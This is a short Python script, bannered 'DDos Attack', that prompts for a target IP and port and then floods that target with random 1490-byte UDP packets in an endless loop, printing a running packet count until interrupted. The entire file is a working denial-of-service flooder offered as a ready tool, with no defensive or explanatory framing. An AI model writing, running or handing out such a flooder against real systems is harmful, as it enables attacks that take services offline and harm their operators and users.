import os
import sys
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print()
print()
ip = input("IP Target: ")
port = int(input("Port: "))

os.system("clear")
os.system("figlet Attack Starting")
time.sleep(3)
sent = 0
try:
    while True:
        sock.sendto(data, (ip, port))
        sent += 1
        # port = port
        print("Sent %s packet to %s through port: %s" % (sent, ip, port))
        # if port == 65534:
        #     port = 1
except KeyboardInterrupt:
    print("\n[Ctrl+C] Attack stopped.")
    sys.exit()
